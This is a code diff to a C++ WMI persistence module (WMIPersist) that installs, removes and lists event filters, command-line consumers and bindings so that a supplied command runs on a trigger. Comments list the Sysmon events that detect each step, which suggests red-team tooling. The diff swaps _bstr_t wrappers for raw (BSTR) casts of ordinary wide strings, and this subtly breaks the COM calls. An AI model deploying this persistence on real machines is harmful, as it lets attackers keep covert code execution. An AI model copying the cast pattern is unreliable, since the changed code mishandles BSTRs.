@@ -6,7 +6,7 @@ static HRESULT ConnectSubscription(IWbemLocator** ppLoc, IWbemServices** ppSvc) 
     HRESULT hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                                    IID_IWbemLocator, (void**)ppLoc);
     if (FAILED(hr)) return hr;
-    hr = (*ppLoc)->ConnectServer(_bstr_t(L"ROOT\\subscription"),
+    hr = (*ppLoc)->ConnectServer((BSTR)L"ROOT\\subscription",
                                  NULL, NULL, NULL, 0, NULL, NULL, ppSvc);
     if (FAILED(hr)) { (*ppLoc)->Release(); *ppLoc = nullptr; return hr; }
     CoSetProxyBlanket(*ppSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
@@ -40,7 +40,7 @@ std::string WMIPersist::Install(const std::string& name, const std::string& cmd)
     // ── 1. __EventFilter ─────────────────────────────────────────────────────
     // Detection: Sysmon EventID 19 — WmiEvent filter created with subscription query.
     IWbemClassObject* pFC = nullptr;
-    pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFC, NULL);
+    pSvc->GetObject((BSTR)L"__EventFilter", 0, NULL, &pFC, NULL);
     IWbemClassObject* pF  = nullptr;
     if (pFC) { pFC->SpawnInstance(0, &pF); pFC->Release(); }
     if (!pF) {
@@ -73,7 +73,7 @@ std::string WMIPersist::Install(const std::string& name, const std::string& cmd)
     // ── 2. CommandLineEventConsumer ───────────────────────────────────────────
     // Detection: Sysmon EventID 20 — WmiEvent consumer with CommandLineTemplate.
     IWbemClassObject* pCC = nullptr;
-    pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pCC, NULL);
+    pSvc->GetObject((BSTR)L"CommandLineEventConsumer", 0, NULL, &pCC, NULL);
     IWbemClassObject* pC  = nullptr;
     if (pCC) { pCC->SpawnInstance(0, &pC); pCC->Release(); }
     if (!pC) {
@@ -99,7 +99,7 @@ std::string WMIPersist::Install(const std::string& name, const std::string& cmd)
     // ── 3. __FilterToConsumerBinding ─────────────────────────────────────────
     // Detection: Sysmon EventID 21 — the binding object ties filter to consumer.
     IWbemClassObject* pBC = nullptr;
-    pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBC, NULL);
+    pSvc->GetObject((BSTR)L"__FilterToConsumerBinding", 0, NULL, &pBC, NULL);
     IWbemClassObject* pB  = nullptr;
     if (pBC) { pBC->SpawnInstance(0, &pB); pBC->Release(); }
     if (!pB) {
@@ -154,13 +154,13 @@ std::string WMIPersist::Remove(const std::string& name) {
         L"__FilterToConsumerBinding.Consumer="
         L"\"CommandLineEventConsumer.Name=\\\"" + wname_c + L"\\\"\","
         L"Filter=\"__EventFilter.Name=\\\"" + wname + L"\\\"\"";
-    pSvc->DeleteInstance(_bstr_t(bindPath.c_str()), 0, NULL, NULL);
+    pSvc->DeleteInstance((BSTR)bindPath.c_str(), 0, NULL, NULL);
 
     std::wstring consPath = L"CommandLineEventConsumer.Name=\"" + wname_c + L"\"";
-    pSvc->DeleteInstance(_bstr_t(consPath.c_str()), 0, NULL, NULL);
+    pSvc->DeleteInstance((BSTR)consPath.c_str(), 0, NULL, NULL);
 
     std::wstring filterPath = L"__EventFilter.Name=\"" + wname + L"\"";
-    pSvc->DeleteInstance(_bstr_t(filterPath.c_str()), 0, NULL, NULL);
+    pSvc->DeleteInstance((BSTR)filterPath.c_str(), 0, NULL, NULL);
 
     pSvc->Release(); pLoc->Release();
     if (ownCom) CoUninitialize();
@@ -183,8 +183,8 @@ std::string WMIPersist::List() {
     }
 
     IEnumWbemClassObject* pEnum = nullptr;
-    pSvc->ExecQuery(_bstr_t(L"WQL"),
-                    _bstr_t(L"SELECT Name,Query FROM __EventFilter"),
+    pSvc->ExecQuery((BSTR)L"WQL",
+                    (BSTR)L"SELECT Name,Query FROM __EventFilter",
                     WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                     NULL, &pEnum);
 
